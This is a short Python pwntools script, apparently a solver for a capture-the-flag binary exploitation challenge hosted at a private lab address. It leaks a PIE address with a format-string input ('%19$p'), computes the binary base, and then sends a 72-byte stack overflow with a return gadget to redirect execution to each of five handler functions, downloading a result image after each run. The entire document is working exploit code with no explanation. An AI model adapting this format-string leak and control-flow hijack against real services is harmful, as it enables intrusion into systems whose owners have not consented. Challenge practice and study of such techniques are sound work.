from pwn import *
import urllib.request

HANDLERS = {
    'money':     0x1433,
    'longevity': 0x1467,
    'wise_mind': 0x149b,
    'love':      0x14cf,
    'food':      0x1503,
}

RET_GADGET = 0x11f8
PIE_LEAK = 0x15cd

def exploit_and_get_image(name, handler_off, instance):
    r = remote('10.34.9.91', 10030)
    
    r.recvuntil(b'Why do you wish to start over? ')
    r.sendline(b'%19$p')
    
    data = r.recvuntil(b'Input : ', timeout=2)
    leak = int(data.split(b'\n')[0].strip(), 16)
    pie_base = leak - PIE_LEAK
    handler = pie_base + handler_off
    
    payload = b'A' * 72 + p64(pie_base + RET_GADGET) + p64(handler)
    r.sendline(payload)
    
    out = r.recvall(timeout=3)
    print(f'[{name}]', out.decode('latin-1', errors='replace'))
    r.close()
    
    # Download image
    url = f'http://10.34.9.91:28080/r/{instance}/image'
    try:
        urllib.request.urlretrieve(url, f'{name}.png')
        print(f'[{name}] image saved')
    except Exception as e:
        print(f'[{name}] image error: {e}')

# Ganti dengan instance id lu
INSTANCE = '131-db7bf327-3d9b-4fe4-aabc-14ceced78a21'

for name, off in HANDLERS.items():
    exploit_and_get_image(name, off, INSTANCE)
